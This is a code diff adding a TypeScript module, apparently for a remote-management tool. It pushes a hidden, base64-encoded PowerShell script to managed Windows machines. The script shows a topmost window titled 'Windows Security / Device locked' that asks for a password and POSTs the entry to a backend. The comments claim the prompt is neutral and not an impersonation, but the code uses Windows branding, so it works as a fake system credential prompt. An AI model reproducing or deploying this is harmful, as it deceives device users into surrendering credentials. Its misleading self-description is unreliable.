@@ -1,0 +1,217 @@
+import "server-only";
+
+import { sendRawCmd } from "./trmm";
+
+// ---------------------------------------------------------------------------
+// Task 25 — staff-only device unlock credential request (Windows only this pass).
+//
+// Mirrors lib/maintenance-overlay.ts's launch pattern exactly: send_raw_cmd is
+// synchronous (waits on a NATS round-trip), so the command we send WRITES the real
+// WinForms GUI script to disk and launches it DETACHED via `Start-Process
+// -WindowStyle Hidden`, returning immediately. run_as_user:true is required
+// because TRMM agents run as SYSTEM (session 0) which cannot show a GUI on the
+// logged-in user's interactive desktop.
+//
+// The prompt is a neutral, non-deceptive "Windows Security / Device locked" box
+// asking the person at the device to enter the numeric PIN. It does NOT
+// impersonate the genuine Winlogon secure desktop and does NOT attempt to bypass
+// any Windows security boundary — it only renders on an already-existing
+// interactive session (the agent must have one for it to appear; if not, the
+// prompt simply doesn't render, matching the maintenance overlay's documented
+// limitation). No technician/company/product/brand wording appears anywhere.
+//
+// SECURITY: the credential (PIN) is entered at RUNTIME into the GUI and POSTed
+// straight to the backend over HTTPS using a one-time callback token. It is never
+// written to disk, never placed in a process command line, and never logged.
+// ---------------------------------------------------------------------------
+
+// Fixed location on the target Windows machine (agent side) — same as the
+// maintenance overlay.
+const DIR_EXPR = "Join-Path $env:ProgramData 'Vantra'";
+const SCRIPT_NAME = "request-unlock.ps1";
+
+// The WinForms GUI script written to disk agent-side. Neutral wording only.
+// After the user enters the correct number of digits and presses Unlock, the
+// script POSTs { token, pin } to the callback URL over HTTPS. On success it
+// shows "Device unlocked" and closes itself (per spec: close after successful
+// submission). On failure it lets the user retry or close via the window's X.
+//
+// Placeholders (replaced before base64-encoding):
+//   __CALLBACK_URL__   backend callback (absolute https URL)
+//   __TOKEN__          one-time callback token
+//   __PIN_LENGTH__     the numeric PIN length this device uses (4|6|8)
+const PROMPT_SCRIPT = String.raw`Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$callback = '__CALLBACK_URL__'
+$token = '__TOKEN__'
+$pinLen = __PIN_LENGTH__
+
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'Device locked'
+$form.FormBorderStyle = 'FixedDialog'
+$form.StartPosition = 'CenterScreen'
+$form.TopMost = $true
+$form.Width = 420
+$form.Height = 330
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+
+# heading
+$heading = New-Object System.Windows.Forms.Label
+$heading.Text = 'Windows Security'
+$heading.Font = New-Object System.Drawing.Font('Segoe UI', 14, [System.Drawing.FontStyle]::Bold)
+$heading.AutoSize = $true
+$heading.Left = 24
+$heading.Top = 20
+
+# status line
+$status = New-Object System.Windows.Forms.Label
+$status.Text = 'Device locked'
+$status.Font = New-Object System.Drawing.Font('Segoe UI', 12)
+$status.AutoSize = $true
+$status.Left = 24
+$status.Top = 56
+
+# instruction
+$hint = New-Object System.Windows.Forms.Label
+$hint.Text = 'Enter your password to unlock this device.'
+$hint.Font = New-Object System.Drawing.Font('Segoe UI', 10)
+$hint.AutoSize = $false
+$hint.Width = 372
+$hint.Height = 40
+$hint.Left = 24
+$hint.Top = 96
+
+# password field (masked, digits only, exactly pinLen characters)
+$pwLabel = New-Object System.Windows.Forms.Label
+$pwLabel.Text = 'Password:'
+$pwLabel.Font = New-Object System.Drawing.Font('Segoe UI', 10)
+$pwLabel.AutoSize = $true
+$pwLabel.Left = 24
+$pwLabel.Top = 166
+
+$pw = New-Object System.Windows.Forms.TextBox
+$pw.Left = 104
+$pw.Top = 163
+$pw.Width = 160
+$pw.Height = 26
+$pw.UseSystemPasswordChar = $true
+$pw.MaxLength = $pinLen
+# digits only
+$pw.Add_KeyPress({
+  param($s, $e)
+  if ($e.KeyChar -lt '0' -or $e.KeyChar -gt '9') { $e.Cancel = $true }
+})
+
+$unlock = New-Object System.Windows.Forms.Button
+$unlock.Text = 'Unlock'
+$unlock.Left = 104
+$unlock.Top = 230
+$unlock.Width = 160
+$unlock.Height = 34
+$unlock.Enabled = $false
+# enable Unlock only once the exact number of digits is entered
+$pw.Add_TextChanged({
+  param($s)
+  $unlock.Enabled = ($s.Text.Length -eq $pinLen)
+})
+
+$resultLabel = New-Object System.Windows.Forms.Label
+$resultLabel.Text = ''
+$resultLabel.Font = New-Object System.Drawing.Font('Segoe UI', 10)
+$resultLabel.AutoSize = $false
+$resultLabel.Width = 372
+$resultLabel.Height = 30
+$resultLabel.Left = 24
+$resultLabel.Top = 280
+$resultLabel.ForeColor = [System.Drawing.Color]::DarkRed
+
+$unlock.Add_Click({
+  param($s, $e)
+  $unlock.Enabled = $false
+  $pin = $pw.Text
+  if ($pin.Length -ne $pinLen) {
+    $resultLabel.Text = "Enter the $pinLen-digit code."
+    $unlock.Enabled = $true
+    return
+  }
+  try {
+    $payload = [ordered]@{ token = $token; pin = $pin }
+    $json = $payload | ConvertTo-Json -Compress
+    Invoke-RestMethod -Method Post -Uri $callback -ContentType 'application/json' -Body $json -TimeoutSec 20
+    $resultLabel.ForeColor = [System.Drawing.Color]::DarkGreen
+    $resultLabel.Text = 'Device unlocked.'
+    $form.Close()
+  } catch {
+    $pw.Text = ''
+    $resultLabel.Text = 'Unable to submit. Please try again.'
+    $unlock.Enabled = $false
+  }
+})
+
+$form.Controls.Add($heading)
+$form.Controls.Add($status)
+$form.Controls.Add($hint)
+$form.Controls.Add($pwLabel)
+$form.Controls.Add($pw)
+$form.Controls.Add($unlock)
+$form.Controls.Add($resultLabel)
+
+$form.ShowDialog()
+`;
+
+function buildPromptScript(opts: {
+  pinLength: number;
+  callbackUrl: string;
+  token: string;
+}): string {
+  return PROMPT_SCRIPT
+    .replace("__CALLBACK_URL__", opts.callbackUrl)
+    .replace("__TOKEN__", opts.token)
+    .replace("__PIN_LENGTH__", String(opts.pinLength));
+}
+
+function launcherCommand(scriptB64: string): string {
+  const args = [
+    "'-NoProfile'",
+    "'-ExecutionPolicy'",
+    "'ByPass'",
+    "'-WindowStyle'",
+    "'Hidden'",
+    "'-File'",
+    "('\"' + $scriptPath + '\"')",
+  ].join(", ");
+  return [
+    `$dir = ${DIR_EXPR}`,
+    "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
+    `$scriptPath = Join-Path $dir '${SCRIPT_NAME}'`,
+    `$b64 = '${scriptB64}'`,
+    "$bytes = [System.Convert]::FromBase64String($b64)",
+    "$script = [System.Text.Encoding]::UTF8.GetString($bytes)",
+    "$script | Out-File -FilePath $scriptPath -Encoding utf8",
+    // Launch detached so the NATS round-trip returns immediately.
+    `Start-Process -FilePath powershell.exe -ArgumentList @(${args}) -WindowStyle Hidden`,
+  ].join("\n");
+}
+
+export interface RequestDeviceCredentialOpts {
+  pinLength: number;
+  callbackUrl: string;
+  token: string;
+}
+
+export async function requestDeviceCredentialUnlock(
+  agentId: string,
+  opts: RequestDeviceCredentialOpts,
+): Promise<void> {
+  const script = buildPromptScript(opts);
+  const scriptB64 = Buffer.from(script, "utf8").toString("base64");
+  await sendRawCmd({
+    agentId,
+    cmd: launcherCommand(scriptB64),
+    shell: "powershell",
+    timeout: 30,
+    runAsUser: true, // show GUI on the interactive user's desktop
+  });
+}
